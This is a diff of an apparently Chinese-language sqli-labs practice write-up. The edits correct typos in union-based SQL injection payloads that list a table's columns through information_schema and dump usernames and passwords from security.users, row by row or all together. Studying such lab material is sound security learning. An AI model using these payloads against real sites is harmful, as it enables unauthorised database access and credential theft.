@@ -143,15 +143,15 @@
 <p><img src="/image/sqli-lab-1/7a5b12879b0c7d34ded4d90813a46395.png" alt="alt text"></p>
 <p>可以得到users，我要找的账号密码信息应该就在其中</p>
 <p>接下里查询 users 表里面全部字段（列名）<br>
-构造:?id=-1' union select 11,group_concat(column_name),33 from information_schema.columns where table_schema='security' table_name='users'--+</p>
+构造:?id=-1' union select 11,group_concat(column_name),33 from information_schema.columns where table_schema='security' and table_name='users'--+</p>
 <p><img src="/image/sqli-lab-1/867b8490d18bdda4a12d2750d0253a4b.png" alt="alt text"></p>
 <p>得到：id 编号、username 账号、password 密码</p>
 <p>最后就是脱库<br>
-构造:?id=-1' union select group_concat(usename,0x7c,password),3 from security.users --+<br>
+构造:?id=-1' union select group_concat(username,0x7c,password),3 from security.users --+<br>
 <img src="/image/sqli-lab-1/b79bdb0bd19e7ccea3756d69110a2e5a.png" alt="alt text"><br>
 这样就成功拿到账号密码了</p>
 <p>但是账号密码太多了，可以构造:<br>
-?id=-1' union select concat(usename,password),3 from security.users limit 0,1 --+<br>
+?id=-1' union select concat(username,password),3 from security.users limit 0,1 --+<br>
 依旧是修改'0'这样就可以慢慢找出全部的账号密码了:<br>
 <img src="/image/sqli-lab-1/b66d6990bec8dbc2aa95d8f8887c7db6.png" alt="alt text"><br>
 <img src="/image/sqli-lab-1/9c077044d76bb81ee48fc6e232f0ce4b.png" alt="alt text"></p>
